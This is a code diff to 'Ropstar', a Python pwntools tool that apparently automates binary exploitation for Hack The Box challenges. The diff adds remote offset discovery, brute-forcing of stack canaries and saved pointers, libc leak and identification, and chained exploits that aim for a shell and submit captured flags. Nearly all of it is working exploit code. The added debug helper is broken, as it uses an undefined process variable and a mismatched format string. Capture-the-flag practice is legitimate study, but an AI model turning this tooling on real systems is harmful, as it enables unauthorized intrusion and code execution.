@@ -26,21 +26,26 @@ class Ropstar():
 		parser.add_argument('-m', help='specify address of main method, in case there is no symbols')
 		parser.add_argument('-xor', help='xor payload with given byte')		
 		parser.add_argument('-win', help='specify win function address to call')	
-		parser.add_argument('-magic', help='magic string that needs to be send before the payload')													
+		parser.add_argument('-magic', help='magic string that needs to be send before the payload')
+		parser.add_argument('-remote_offset', help='get offset remotely via observing responses (often required with canaries)', action='store_true')																										
 		self.args = parser.parse_args()
-		self.username = os.getlogin()	
+		self.home = os.getlogin()
+		if self.home == 'root':
+			self.home = '/'+self.home
+		else:
+			self.home = '/home/'+self.home
 		if self.args.cid:
-			with open('/home/'+self.username+'/.htb_apikey','r') as f:
+			with open(self.home+'/.htb_apikey','r') as f:
 				self.api_key = f.read()
 				log.success("Read api_key: "+self.api_key[:6]+"...")				
 		# set context
 		context.endian = "little"
 		context.os = "linux"
 		context.log_level = "debug"		
-		context.timeout = 10	
+		context.timeout = 10
 		self.t = Timeout()
 		self.bname = self.args.bin
-		self.binary = ELF("./"+self.bname )
+		self.binary = ELF(self.bname)
 		self.arch = self.binary.get_machine_arch()
 		log.info("Arch: "+self.arch)
 		if self.arch  == 'i386':
@@ -52,16 +57,22 @@ class Ropstar():
 			context.bits = 64
 			context.arch = self.arch 
 			context.kernel = self.arch 
-			self.pattern_reg = "rsp"		
+			self.pattern_reg = "rsp"	
+		if self.args.remote_offset:
+			if not self.args.rhost or not self.args.rport:
+				log.failure("You need to specify rhost & rport to use remote_offset")
+				sys.exit(0)	
 		self.offset = -1
+		if self.args.xor:
+			self.xor = self.args.xor.decode('hex')
 		self.leak = Leak(self)	
 		self.exploit = Exploit(self)
 		# identity + rot13 for now
 		self.encodings = [lambda x: x, lambda x: rot13(x)]
-		if self.args.xor:
-			self.encodings.append(lambda x: xor(x, self.args.xor))
-		# some config options
+		self.success_marker = ''
+		# some config options		
 		self.pattern_length = 2000
+
 
 
 	def connect(self):
@@ -74,22 +85,27 @@ class Ropstar():
 		else:
 			log.info("Using local target")	
 			# env={'LD_PRELOAD': os.path.join(os.getcwd(), 'libc.so.6')}
-			p = process("./"+self.bname)
+			p = process(self.bname)
 		return p
 
 
-	def trigger(self, p, payload):
+	def trigger(self, p, payload='', newline=True, recvall=False):
 		''' function that puts payload into vulnerable buffer
 		'''
 		result = ''
 		if self.args.magic:
-			p.sendline(self.args.magic)
-		p.sendline(payload)
-		# the amount of lines that need to be read 
-		# before getting the result depends on the binary so we
-		# read a lot
+			payload = self.args.magic + payload
+		if self.args.xor:
+			payload = xor(payload, self.xor)
+		if newline:
+			p.sendline(payload)
+		else:
+			p.send(payload)
 		try:
-			result = p.recvlines(numlines=100, timeout=1)
+			if recvall:
+				result = p.recvall(timeout=2)
+			else:
+				result = p.recvlines(numlines=100, timeout=2)
 		except EOFError:
 			pass
 		return result
@@ -101,7 +117,7 @@ class Ropstar():
 		p = self.connect()
 		result = ''
 		if self.args.magic:
-			p.sendline(self.args.magic)
+			p.send(self.args.magic) # or sendline?
 		p.sendline(payload)
 		try:
 			result = p.recvall()			
@@ -132,10 +148,36 @@ class Ropstar():
 
 	
 	def get_dynamic(self):
+		if not self.args.remote_offset:
+			return self.get_offset_local()
+		else:
+			return self.get_offset_remote()
+
+
+	def get_offset_remote(self):
+		''' Trial and error offset retrieval
+		'''	
+		for i in range(1, self.pattern_length):
+			p = self.connect()
+			try:
+				result = self.trigger(p, cyclic(i))
+				if self.success_marker not in result:
+					self.offset = i-1
+					log.success("Offset: "+str(self.offset))
+					return True 	
+			except EOFError:
+				self.offset = i
+				log.success("Offset: "+str(self.offset))
+				return True
+			p.close()		
+		return False
+
+
+	def get_offset_local(self):
 		''' get offset with unique pattern
 		'''
 		for enc in self.encodings:
-			p = process("./"+self.bname)
+			p = process(self.bname)
 			pattern = cyclic(self.pattern_length)
 			pattern = enc(pattern)
 			if self.args.magic:
@@ -157,6 +199,17 @@ class Ropstar():
 		return False
 
 
+	def get_success_marker(self):
+		'''
+		'''
+		p = self.connect()
+		# get positive verifier, so we know what to expect if it doesn't crash
+		result = self.trigger(p, 'test', newline=False, recvall=True)
+		self.success_marker = result[-6:]
+		log.info("Success marker: "+self.success_marker)
+		p.close()
+
+
 	def check_success(self, p):
 		''' Check if we can execute shell commands and submit the flag when doing htb challenges
 		'''
@@ -169,8 +222,7 @@ class Ropstar():
 				flag = p.recvline()
 				if self.args.cid and len(flag) > 0 and flag.find('No such file or directory') == -1:
 					self.submit_challenge_flag(flag.strip("\n"))
-					log.success("Submitted flag: "+flag)
-					#log.success("Submitted flag: <censored>")						
+					log.success("Submitted flag: "+flag)			
 				else:
 					log.info("Not submitted")
 				log.info('Time spent: '+str(round((time.time() - self.start_time),2))+'s')	
@@ -182,9 +234,18 @@ class Ropstar():
 		return False
 
 
+	def debug(self, bp):
+		gdb.attach(p, '''
+		set follow-fork-mode child
+		set breakpoint %s
+		continue
+		'''.format(bp))
+
+
 	def main(self):
 		self.start_time = time.time()
-		# offset can also be given on command line
+
+		# offset can also be given on command line		
 		if not self.args.o:
 			# resolve offset dynamically
 			log.info("Getting offset")
@@ -208,6 +269,39 @@ class Ropstar():
 			self.offset = int(self.args.o)
 			log.info("Offset: "+str(self.offset))
 
+		if self.binary.canary:
+			# we need a marker for successful, non crashing requests to bruteforce values
+			self.get_success_marker()
+			log.info("Binary uses stack canary")
+			log.info("Bruting canary, base ptr, intr ptr")	
+			log.info("This can take a while, go grab a coffee")
+			pause()
+			payload = cyclic(self.offset)
+			canary = self.leak.leak_qword(payload) # canary
+			payload += canary
+			base_ptr = self.leak.leak_qword(payload) # rbp
+			payload += base_ptr
+			instr_ptr = self.leak.leak_qword(payload) # rip
+			payload += instr_ptr
+			log.info("canary: "+hex(u64(canary)))
+			log.info("base ptr: "+hex(u64(base_ptr)))
+			log.info("instr ptr: "+hex(u64(instr_ptr)))
+			log.info("You probably want to copy these")
+			pause()	
+			# at this point we can assume we have the values				
+			self.canary = u64(canary)
+			self.base_ptr = u64(base_ptr)
+			self.instr_ptr = u64(instr_ptr)			
+			'''	
+			self.canary =  manual
+			self.base_ptr = manual
+			self.instr_ptr = manual
+			'''
+			addr = self.instr_ptr - (self.instr_ptr & 0xfff)	
+			entry_offset = (self.binary.entry & 0xfffffffffffff000)
+			self.binary.address =  addr - entry_offset			
+			log.info("Base: "+hex(self.binary.address))
+
 		
 		# leakless works for static & non-static binaries
 		log.info("Checking for leakless exploitation")
@@ -225,16 +319,16 @@ class Ropstar():
 		# dynamic complied binary, try leaking libc & exploiting via libc
 		log.info("Getting Leak")
 		p = self.connect()		
-		leak = self.leak.get_leak(p)
+		leak = self.leak.leak_libc(p)
 		p.close()
 		if len(leak) > 0:
 			log.info("Getting libc version")
-			versions = self.leak.get_libc(leak)
-			exploits = [self.exploit.bss,self.exploit.bss_execve,self.exploit.default]
+			versions = self.leak.ident_libc(leak)
+			exploits = [self.exploit.bss, self.exploit.bss_execve, self.exploit.default]
 			for version in versions:
 				for exploit in exploits:
 					p = self.connect()
-					leak = self.leak.get_leak(p)
+					leak = self.leak.leak_libc(p)
 					if len(leak) == 0:
 						continue
 					log.info("Using "+version)
@@ -244,16 +338,17 @@ class Ropstar():
 						log.failure("Could not load "+version+ "(skipping)")
 						continue
 					name, addr = leak.items()[0]
-					libc_base = addr - libc.symbols[name]
-					log.success("Libc base: {0}".format(hex(libc_base)))
+					libc.address = addr - libc.symbols[name]
+					log.success("Libc base: {0}".format(hex(libc.address)))
 					# exploit
 					log.info("Running exploits")
 					try:
-						if exploit(p, libc, libc_base):
+						if exploit(p, libc):
 							log.success("Done!")
 							return				
 					except EOFError:
 						pass
+				log.failure("Could not exploit target.")
 				p.close()
 		else:
 			log.failure("Could not leak anything")
